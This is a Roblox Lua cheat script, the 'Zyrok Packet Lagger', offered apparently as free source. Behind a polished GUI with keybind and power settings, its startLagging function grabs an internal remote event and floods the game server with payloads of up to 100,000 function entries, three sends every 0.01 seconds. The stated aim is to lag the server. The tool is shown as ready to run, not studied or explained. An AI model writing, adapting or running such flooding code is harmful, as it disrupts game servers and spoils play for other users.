-- Zyrok Packet Lagger | Clean by Prince Bot | .gg/freesource
local Players           = game:GetService("Players")
local UserInputService  = game:GetService("UserInputService")
local TweenService      = game:GetService("TweenService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService       = game:GetService("HttpService")
local RunService        = game:GetService("RunService")

local LP = Players.LocalPlayer
while not LP do
    LP = Players.LocalPlayer
    wait(0.1)
end

local playerGui = LP:FindFirstChildOfClass("PlayerGui")
while not playerGui do
    playerGui = LP:FindFirstChildOfClass("PlayerGui")
    wait(0.1)
end

local CONFIG_FILE = "ZyrokPacketLagger_Config.json"

-- Black theme palette
local C = {
    panelTop  = Color3.fromRGB(18,  18,  18),
    panelBot  = Color3.fromRGB(6,   6,   6),
    edge      = Color3.fromRGB(55,  55,  55),
    accent    = Color3.fromRGB(240, 240, 240),
    accentBr  = Color3.fromRGB(255, 255, 255),
    label     = Color3.fromRGB(150, 150, 150),
    white     = Color3.fromRGB(245, 245, 245),
    field     = Color3.fromRGB(22,  22,  22),
    fieldEdge = Color3.fromRGB(50,  50,  50),
    stop      = Color3.fromRGB(70,  70,  70),
}

local function make(cls, props, parent)
    local o = Instance.new(cls)
    for k, v in pairs(props or {}) do o[k] = v end
    o.Parent = parent
    return o
end
local function corner(p, r)
    make("UICorner", { CornerRadius = UDim.new(0, r) }, p)
end
local function stroke(p, col, th, tr)
    return make("UIStroke", {
        Color = col, Thickness = th, Transparency = tr or 0,
        ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
    }, p)
end
local function tw(obj, props, t)
    TweenService:Create(
        obj,
        TweenInfo.new(t or 0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
        props
    ):Play()
end

local lagging       = false
local lagCoroutine  = nil
local intensity     = 42000
local toggleKey     = Enum.KeyCode.C
local toggleKeyName = "C"

local function clampIntensity(v)
    v = tonumber(v)
    if not v then return intensity end
    return math.clamp(math.floor(v), 1, 100000)
end

local Event = nil
spawn(function()
    local ok, pkgs = pcall(function()
        return ReplicatedStorage:FindFirstChild("Packages")
    end)
    if not (ok and pkgs) then
        local t = 0
        while not pkgs and t < 10 do
            pkgs = ReplicatedStorage:FindFirstChild("Packages")
            wait(0.5)
            t = t + 0.5
        end
    end
    if not pkgs then return end
    local net = pkgs:FindFirstChild("Net")
    if not net then
        wait(5)
        net = pkgs:FindFirstChild("Net")
    end
    if not net then return end
    local kids = net:GetChildren()
    Event = kids[230]
end)

local function saveConfig(panel)
    if not writefile then return end
    local ok, cfg = pcall(function()
        return HttpService:JSONEncode({
            Intensity = intensity,
            Keybind   = toggleKeyName,
            PX_S = panel.Position.X.Scale, PX_O = panel.Position.X.Offset,
            PY_S = panel.Position.Y.Scale, PY_O = panel.Position.Y.Offset,
        })
    end)
    if ok then pcall(writefile, CONFIG_FILE, cfg) end
end

local function loadConfig(panel, intBox, keyBtn)
    if not (readfile and isfile) then return end
    if not isfile(CONFIG_FILE) then return end
    local ok, cfg = pcall(function()
        return HttpService:JSONDecode(readfile(CONFIG_FILE))
    end)
    if not (ok and type(cfg) == "table") then return end
    if tonumber(cfg.Intensity) then
        intensity = clampIntensity(cfg.Intensity)
        if intBox then intBox.Text = tostring(intensity) end
    end
    if type(cfg.Keybind) == "string" and cfg.Keybind ~= "" then
        toggleKeyName = cfg.Keybind
        toggleKey     = Enum.KeyCode[cfg.Keybind] or Enum.KeyCode.C
        keyBtn.Text   = "[" .. toggleKeyName .. "]"
    end
    if tonumber(cfg.PX_S) then
        panel.Position = UDim2.new(cfg.PX_S, cfg.PX_O, cfg.PY_S, cfg.PY_O)
    end
end

local prev = playerGui:FindFirstChild("ZyrokPacketLagger")
if prev then prev:Destroy() end

local screenGui = make("ScreenGui", {
    Name           = "ZyrokPacketLagger",
    ResetOnSpawn   = false,
    IgnoreGuiInset = true,
    ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
    DisplayOrder   = 100,
}, playerGui)

local panel = make("Frame", {
    Name              = "MainPanel",
    AnchorPoint       = Vector2.new(0.5, 0.5),
    Position          = UDim2.fromScale(0.5, 0.5),
    Size              = UDim2.fromOffset(220, 240),
    BackgroundColor3  = C.panelTop,
    BorderSizePixel   = 0,
    Active            = true,
    ClipsDescendants  = false,
    ZIndex            = 2,
}, screenGui)
corner(panel, 26)
stroke(panel, C.edge, 2, 0.05)
make("UIGradient", {
    Rotation = 90,
    Color    = ColorSequence.new({
        ColorSequenceKeypoint.new(0, C.panelTop),
        ColorSequenceKeypoint.new(1, C.panelBot),
    }),
}, panel)

-- Background image
local bgImage = make("ImageLabel", {
    Name = "BackgroundImage",
    Size = UDim2.fromScale(1, 1),
    BackgroundTransparency = 1,
    Image = "rbxassetid://113304379387669",
    ImageTransparency = 0.5,
    ScaleType = Enum.ScaleType.Crop,
    ZIndex = 1,
}, panel)
corner(bgImage, 26)

local dragHandle = make("TextButton", {
    Position           = UDim2.fromScale(0, 0),
    Size               = UDim2.fromScale(1, 0.20),
    BackgroundTransparency = 1,
    Text               = "",
    AutoButtonColor    = false,
    Active             = true,
    ZIndex             = 5,
}, panel)

local titleLbl = make("TextLabel", {
    BackgroundTransparency = 1,
    Position               = UDim2.fromScale(0.055, 0.22),
    Size                   = UDim2.fromScale(0.78, 0.42),
    Font                   = Enum.Font.GothamBold,
    Text                   = "ZYROK PACKET LAGGER",
    TextColor3             = C.white,
    TextScaled             = true,
    TextXAlignment         = Enum.TextXAlignment.Left,
    ZIndex                 = 6,
}, dragHandle)
make("UITextSizeConstraint", { MinTextSize = 13, MaxTextSize = 20 }, titleLbl)

make("Frame", {
    Position         = UDim2.fromScale(0.055, 0.78),
    Size             = UDim2.new(0.89, 0, 0, 3),
    BackgroundColor3 = C.accent,
    BorderSizePixel  = 0,
    ZIndex           = 6,
}, dragHandle)

-- Settings gear button (top right)
local settingsBtn = make("TextButton", {
    Name = "SettingsBtn",
    Position = UDim2.new(1, -34, 0, 8),
    Size = UDim2.fromOffset(26, 26),
    BackgroundColor3 = C.field,
    BackgroundTransparency = 0.15,
    BorderSizePixel = 0,
    Text = "⚙",
    TextColor3 = C.white,
    TextSize = 16,
    Font = Enum.Font.GothamBold,
    AutoButtonColor = false,
    ZIndex = 8,
}, panel)
corner(settingsBtn, 8)
stroke(settingsBtn, C.fieldEdge, 1, 0.3)

-- ===== RUN button (top of body) =====
local startBtn = make("TextButton", {
    Position           = UDim2.fromScale(0.055, 0.28),
    Size               = UDim2.fromScale(0.89, 0.17),
    BackgroundColor3   = C.accent,
    BorderSizePixel    = 0,
    AutoButtonColor    = false,
    Font               = Enum.Font.GothamBold,
    Text               = "RUN",
    TextColor3         = C.panelBot,
    TextScaled         = true,
    ZIndex             = 4,
}, panel)
corner(startBtn, 15)
local startOutline = stroke(startBtn, C.accentBr, 1.5, 1)
make("UITextSizeConstraint", { MinTextSize = 16, MaxTextSize = 23 }, startBtn)

-- ===== KEYBIND (below RUN) =====
make("TextLabel", {
    BackgroundTransparency = 1,
    Position               = UDim2.fromScale(0.055, 0.58),
    Size                   = UDim2.fromScale(0.89, 0.055),
    Font                   = Enum.Font.GothamBold,
    Text                   = "KEYBIND",
    TextColor3             = C.label,
    TextScaled             = true,
    TextXAlignment         = Enum.TextXAlignment.Left,
    ZIndex                 = 3,
}, panel)

local keyBtn = make("TextButton", {
    Position           = UDim2.fromScale(0.055, 0.64),
    Size               = UDim2.fromScale(0.89, 0.135),
    BackgroundColor3   = C.field,
    BorderSizePixel    = 0,
    AutoButtonColor    = false,
    Font               = Enum.Font.GothamBold,
    Text               = "[" .. toggleKeyName .. "]",
    TextColor3         = C.white,
    TextScaled         = true,
    ZIndex             = 3,
}, panel)
corner(keyBtn, 14)
stroke(keyBtn, C.fieldEdge, 1, 0.25)
make("UITextSizeConstraint", { MinTextSize = 15, MaxTextSize = 22 }, keyBtn)

-- ===== Settings overlay =====
local settingsPanel = make("Frame", {
    Name = "SettingsPanel",
    Size = UDim2.fromScale(1, 1),
    BackgroundColor3 = C.panelBot,
    BorderSizePixel = 0,
    ZIndex = 20,
    Visible = false,
}, panel)
corner(settingsPanel, 26)
stroke(settingsPanel, C.edge, 2, 0.1)

local settingsBg = make("ImageLabel", {
    Size = UDim2.fromScale(1, 1),
    BackgroundTransparency = 1,
    Image = "rbxassetid://113304379387669",
    ImageTransparency = 0.55,
    ScaleType = Enum.ScaleType.Crop,
    ZIndex = 1,
}, settingsPanel)
corner(settingsBg, 26)

-- Click blocker
make("TextButton", {
    Name = "Blocker",
    Size = UDim2.fromScale(1, 1),
    BackgroundTransparency = 1,
    Text = "",
    AutoButtonColor = false,
    ZIndex = 19,
}, settingsPanel)

local settingsTitle = make("TextLabel", {
    BackgroundTransparency = 1,
    Position = UDim2.fromScale(0.055, 0.05),
    Size = UDim2.fromScale(0.70, 0.10),
    Font = Enum.Font.GothamBold,
    Text = "SETTINGS",
    TextColor3 = C.white,
    TextScaled = true,
    TextXAlignment = Enum.TextXAlignment.Left,
    ZIndex = 21,
}, settingsPanel)
make("UITextSizeConstraint", { MinTextSize = 14, MaxTextSize = 20 }, settingsTitle)

local closeBtn = make("TextButton", {
    Position = UDim2.new(1, -34, 0, 8),
    Size = UDim2.fromOffset(26, 26),
    BackgroundColor3 = C.field,
    BorderSizePixel = 0,
    Text = "×",
    TextColor3 = C.white,
    TextSize = 18,
    Font = Enum.Font.GothamBold,
    AutoButtonColor = false,
    ZIndex = 22,
}, settingsPanel)
corner(closeBtn, 8)
stroke(closeBtn, C.fieldEdge, 1, 0.3)

-- Power label (only inside settings now)
make("TextLabel", {
    BackgroundTransparency = 1,
    Position = UDim2.fromScale(0.055, 0.24),
    Size = UDim2.fromScale(0.89, 0.055),
    Font = Enum.Font.GothamBold,
    Text = "POWER",
    TextColor3 = C.label,
    TextScaled = true,
    TextXAlignment = Enum.TextXAlignment.Left,
    ZIndex = 21,
}, settingsPanel)

local settingsPowerBox = make("TextBox", {
    Position = UDim2.fromScale(0.055, 0.30),
    Size = UDim2.fromScale(0.89, 0.135),
    BackgroundColor3 = C.field,
    BorderSizePixel = 0,
    ClearTextOnFocus = false,
    Font = Enum.Font.GothamBold,
    Text = tostring(intensity),
    TextColor3 = C.white,
    TextScaled = true,
    TextXAlignment = Enum.TextXAlignment.Center,
    ZIndex = 21,
}, settingsPanel)
corner(settingsPowerBox, 14)
stroke(settingsPowerBox, C.fieldEdge, 1, 0.25)
make("UITextSizeConstraint", { MinTextSize = 15, MaxTextSize = 22 }, settingsPowerBox)

-- Device label
make("TextLabel", {
    BackgroundTransparency = 1,
    Position = UDim2.fromScale(0.055, 0.46),
    Size = UDim2.fromScale(0.89, 0.055),
    Font = Enum.Font.GothamBold,
    Text = "DEVICE",
    TextColor3 = C.label,
    TextScaled = true,
    TextXAlignment = Enum.TextXAlignment.Left,
    ZIndex = 21,
}, settingsPanel)

local mobileBtn = make("TextButton", {
    Position = UDim2.fromScale(0.055, 0.52),
    Size = UDim2.new(0.43, 0, 0.135, 0),
    BackgroundColor3 = C.field,
    BorderSizePixel = 0,
    Font = Enum.Font.GothamBold,
    Text = "MOBILE",
    TextColor3 = C.white,
    TextScaled = true,
    AutoButtonColor = false,
    ZIndex = 21,
}, settingsPanel)
corner(mobileBtn, 12)
stroke(mobileBtn, C.fieldEdge, 1, 0.25)
make("UITextSizeConstraint", { MinTextSize = 13, MaxTextSize = 18 }, mobileBtn)

local pcBtn = make("TextButton", {
    Position = UDim2.new(0.515, 0, 0.52, 0),
    Size = UDim2.new(0.43, 0, 0.135, 0),
    BackgroundColor3 = C.field,
    BorderSizePixel = 0,
    Font = Enum.Font.GothamBold,
    Text = "PC",
    TextColor3 = C.white,
    TextScaled = true,
    AutoButtonColor = false,
    ZIndex = 21,
}, settingsPanel)
corner(pcBtn, 12)
stroke(pcBtn, C.fieldEdge, 1, 0.25)
make("UITextSizeConstraint", { MinTextSize = 13, MaxTextSize = 18 }, pcBtn)

-- ===== Sync / settings logic =====
local function setIntensity(v)
    intensity = clampIntensity(v)
    settingsPowerBox.Text = tostring(intensity)
end

settingsPowerBox.FocusLost:Connect(function()
    setIntensity(settingsPowerBox.Text)
    saveConfig(panel)
end)

mobileBtn.Activated:Connect(function()
    setIntensity(15000)
    saveConfig(panel)
end)

pcBtn.Activated:Connect(function()
    setIntensity(30000)
    saveConfig(panel)
end)

local settingsOpen = false
settingsBtn.Activated:Connect(function()
    settingsOpen = true
    settingsPanel.Visible = true
end)
closeBtn.Activated:Connect(function()
    settingsOpen = false
    settingsPanel.Visible = false
end)

-- ===== RUN / RUNNING states =====
local function paintRunning()
    tw(startBtn, { BackgroundColor3 = C.stop, TextColor3 = C.white }, 0.15)
    startBtn.Text = "RUNNING"
    tw(startOutline, { Transparency = 0 }, 0.15)
end
local function paintIdle()
    tw(startBtn, { BackgroundColor3 = C.accent, TextColor3 = C.panelBot }, 0.15)
    startBtn.Text = "RUN"
    tw(startOutline, { Transparency = 1 }, 0.15)
end

local function startLagging()
    if lagging then return end
    if not Event then
        warn("[ZyrokLagger] Event not ready yet — wait a moment and try again")
        return
    end
    intensity = clampIntensity(intensity)
    settingsPowerBox.Text = tostring(intensity)
    lagging       = true
    paintRunning()
    local payload = table.create(intensity, function() end)
    lagCoroutine = coroutine.wrap(function()
        while lagging do
            for _ = 1, 3 do
                pcall(function() Event:FireServer(payload) end)
            end
            wait(0.01)
        end
    end)
    spawn(lagCoroutine)
end

local function stopLagging()
    if not lagging then return end
    lagging      = false
    lagCoroutine = nil
    paintIdle()
end

local function toggle()
    if lagging then stopLagging() else startLagging() end
end

startBtn.Activated:Connect(toggle)

-- ===== Keybind =====
local waitingForKey = false
keyBtn.Activated:Connect(function()
    if waitingForKey then return end
    waitingForKey = true
    keyBtn.Text = "[PRESS KEY]"
    keyBtn.TextColor3 = C.accentBr
end)

UserInputService.InputBegan:Connect(function(input, gpe)
    if gpe then return end
    if waitingForKey then
        if input.UserInputType == Enum.UserInputType.Keyboard
            and input.KeyCode ~= Enum.KeyCode.Unknown
            and input.KeyCode ~= Enum.KeyCode.Escape then
            toggleKey     = input.KeyCode
            toggleKeyName = toggleKey.Name
            keyBtn.Text   = "[" .. toggleKeyName .. "]"
            keyBtn.TextColor3 = C.white
            waitingForKey = false
            saveConfig(panel)
        end
        return
    end
    if input.UserInputType == Enum.UserInputType.Keyboard
        and input.KeyCode == toggleKey then
        toggle()
    end
end)

-- ===== Dragging =====
local dragging, dragStart, panelStart, dragInput = false, nil, nil, nil

dragHandle.InputBegan:Connect(function(input)
    if settingsOpen then return end
    if input.UserInputType == Enum.UserInputType.MouseButton1
        or input.UserInputType == Enum.UserInputType.Touch then
        dragging   = true
        dragStart  = input.Position
        panelStart = panel.Position
        if input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging  = false
                dragInput = nil
                saveConfig(panel)
            end
        end)
    end
end)

dragHandle.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement
        or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if not dragging or not dragStart then return end
    local isMM = input.UserInputType == Enum.UserInputType.MouseMovement
    local isT  = dragInput and input == dragInput
    if not isMM and not isT then return end
    local d  = input.Position - dragStart
    local ox = panelStart.X.Offset + d.X
    local oy = panelStart.Y.Offset + d.Y
    local cam = workspace.CurrentCamera
    if cam then
        local vp = cam.ViewportSize
        local hw = panel.AbsoluteSize.X / 2
        local hh = panel.AbsoluteSize.Y / 2
        ox = math.clamp(ox, -vp.X/2 + hw, vp.X/2 - hw)
        oy = math.clamp(oy, -vp.Y/2 + hh, vp.Y/2 - hh)
    end
    panel.Position = UDim2.new(0.5, ox, 0.5, oy)
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1
        or input.UserInputType == Enum.UserInputType.Touch then
        dragging  = false
        dragInput = nil
    end
end)

spawn(function() loadConfig(panel, settingsPowerBox, keyBtn) end)
paintIdle()